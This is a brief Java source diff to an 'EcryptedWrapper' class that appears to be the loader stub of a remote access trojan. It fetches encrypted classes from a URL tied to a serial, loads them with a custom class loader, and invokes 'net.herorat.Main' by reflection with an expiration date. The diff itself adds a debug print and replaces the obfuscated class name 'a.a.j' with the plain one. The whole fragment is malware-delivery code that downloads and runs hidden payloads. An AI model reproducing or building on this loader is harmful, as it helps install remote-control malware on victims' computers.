@@ -20,20 +20,24 @@ public class EcryptedWrapper implements Runnable
 		EncryptedLoader loader = new EncryptedLoader(this.serial, this.url);
 		try
 		{
+			System.out.println("Get's before loader.load()");
 			loader.load();
 			classLoader = new EncryptedClassLoader(loader.getClasses(), loader.getResources());
+			
 		}
 		catch(Exception e)
 		{
+			
 			e.printStackTrace();
 		}
 	}
 
+	@Override
 	public void run()
 	{
 		try
 		{
-			Class<?> c = classLoader.loadClass("a.a.j");
+			Class<?> c = classLoader.loadClass("net.herorat.Main");
 			c.getMethod("main", new Class[] { java.lang.String[].class}).invoke(null, new Object[]{new String[] {this.expiration_date}});
 		}
 		catch(Exception e)
